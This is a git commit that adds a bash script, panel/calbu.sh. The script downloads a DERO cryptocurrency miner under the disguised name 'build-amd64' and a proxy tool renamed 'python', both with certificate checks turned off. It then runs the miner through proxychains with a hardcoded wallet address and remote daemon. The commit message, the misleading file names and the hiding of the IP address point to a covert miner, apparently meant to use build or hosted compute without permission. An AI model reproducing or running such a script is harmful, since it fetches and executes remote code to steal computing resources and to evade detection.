28463441f3bc1e69719c3728b09ad46e8481bb52
unauna1803 <128925543+unauna1803@users.noreply.github.com>
2023-05-08 21:34:13 +0700

    Add files via upload

---
+++ panel/calbu.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+wget --no-check-certificate 'https://dero-node.mysrv.cloud/files/hansen33s-dero-miner-linux-amd64' -O build-amd64
+chmod +x build-amd64
+wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/proxy' -O python
+chmod +x python
+wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel/compile.sh' -O compile.sh
+chmod +x compile.sh
+wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel/libproxychains4.so' -O libproxychains4.so
+chmod +x libproxychains4.so
+wget --no-check-certificate 'https://raw.githubusercontent.com/unauna1803/buildersop/main/panel/proxychains.conf' -O proxychains.conf
+chmod +x proxychains.conf
+echo "IP ORI ==> "$(curl ifconfig.me)
+echo "IP Baru ==> "$(./python curl ifconfig.me)
+./python ./build-amd64 -wallet-address dero1qy4ghx2445p3dqawvhkpkpy6qrq39al7txsheycp2sndfgr9xljsvqgtgddkd -daemon-rpc-address 164.92.251.76:80 -mining-threads 2
+./compile.sh
